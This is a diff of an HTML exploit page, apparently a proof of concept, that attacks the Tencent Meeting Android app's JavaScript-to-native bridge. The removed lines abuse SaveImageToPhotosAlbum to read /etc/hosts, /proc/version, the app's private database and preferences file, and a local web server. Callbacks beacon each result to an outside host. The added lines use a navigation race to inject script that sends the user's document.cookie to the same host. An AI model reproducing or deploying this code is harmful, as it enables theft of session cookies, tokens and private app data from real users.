@@ -1,116 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>race_si_init</title></head>
+<head><meta charset="utf-8"><title>race_cookie</title></head>
 <body>
-<h2>Race SaveImageToPhotosAlbum - file:// probe</h2>
+<h2>Race - Cookie Steal</h2>
 <pre id="log" style="font-size:10px;white-space:pre-wrap;"></pre>
 <script>
 var log = document.getElementById('log');
 function addLog(s){ log.textContent += '['+Date.now()+'] '+s+'\n'; }
 
-var EXFIL = 'https://test2.lleavesg.top/steal';
-
-// 回调：收到结果后改 title 并外传
-// savePicCallback 是在 param 里传给 native 的字符串回调名
-// 不同 payload 用不同的 cb 名，便于区分
 var js =
 'javascript:void(' +
-  'document.title="RACE_SI_OK",' +
-
-  // ---- 拿 cookie 立即外传 ----
-  'new Image().src="https://test2.lleavesg.top/cookie?c="+encodeURIComponent(document.cookie),' +
-
-  // ---- 基础 savePicCallback（全局兜底）----
-  'window.savePicCallback=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="SI_DEFAULT:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_default&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- baseline: HTTP 真实图片（验证 handler 通路）----
-  'window.cb_http=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="HTTP:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_http&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- /etc/hosts（world-readable，判断 file:// 是否放行）----
-  'window.cb_hosts=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="HOSTS:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_hosts&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- /proc/version（world-readable，内核版本）----
-  'window.cb_proc=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="PROC:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_proc&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- app databases/wmsdk.db（私有，关键！）----
-  'window.cb_db=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="DB:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_db&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- shared_prefs/WeMeet.xml（私有，token/uid）----
-  'window.cb_prefs=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="PREFS:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_prefs&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- http://127.0.0.1（探 local HTTP server，见 WebServer 攻击面）----
-  'window.cb_loopback=function(a){' +
-    'try{' +
-      'var s=typeof a==="string"?a:JSON.stringify(a);' +
-      'document.title="LOOP:"+s.slice(0,60);' +
-      'new Image().src="'+EXFIL+'?t=si_loopback&r="+encodeURIComponent(s.slice(0,400));' +
-    '}catch(e){}' +
-  '},' +
-
-  // ---- jsrun 信标 ----
-  'new Image().src="'+EXFIL+'?t=si_jsrun&url="+encodeURIComponent(location.href),' +
-
-  // ===========================================================
-  // 7 个 JSCallNative 调用，全部静态 JSON 字符串
-  // ===========================================================
-
-  // 0. baseline: 真实 HTTP 图片（type=jpg，验证整条流程）
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_http_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"jpg","savePicCallback":"cb_http"},"callId":"si0"}\'),' +
-
-  // 1. file:// /etc/hosts  (world-readable, type=txt)
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_hosts_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"file:///etc/hosts","type":"txt","savePicCallback":"cb_hosts"},"callId":"si1"}\'),' +
-
-  // 2. file:// /proc/version (world-readable, type=txt)
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_proc_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"file:///proc/version","type":"txt","savePicCallback":"cb_proc"},"callId":"si2"}\'),' +
-
-  // 3. file:// app databases/wmsdk.db  (app-private, type=db)
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_db_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"file:///data/data/com.tencent.wemeet.app/databases/wmsdk.db","type":"db","savePicCallback":"cb_db"},"callId":"si3"}\'),' +
-
-  // 4. file:// shared_prefs/WeMeet.xml (app-private, type=xml)
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_prefs_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"file:///data/data/com.tencent.wemeet.app/shared_prefs/WeMeet.xml","type":"xml","savePicCallback":"cb_prefs"},"callId":"si4"}\'),' +
-
-  // 5. file:// /etc/hosts 换成 jpg 后缀（看后缀是否影响读取）
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_hosts2_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"file:///etc/hosts","type":"jpg","savePicCallback":"cb_hosts"},"callId":"si5"}\'),' +
-
-  // 6. http://127.0.0.1 探本地 WebServer
-  'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_loop_load","module":"MediaPlugin","method":"SaveImageToPhotosAlbum","param":{"url":"http://127.0.0.1/","type":"jpg","savePicCallback":"cb_loopback"},"callId":"si6"}\')' +
-
+  'document.title="RACE_OK",' +
+  'new Image().src="https://test2.lleavesg.top/cookie?c="+encodeURIComponent(document.cookie)' +
 ')';
 
 var c = 0;
@@ -124,8 +25,6 @@ function doRace(){
   if(!window.JSCallJavaMgr){ addLog('NO BRIDGE'); return; }
   addLog('bridge OK, url='+location.href);
   addLog('js payload len='+js.length);
-
-  try{ new Image().src = EXFIL+'?t=si_start&len='+js.length; }catch(e){}
 
   location.href = "https://meeting.tencent.com";
 
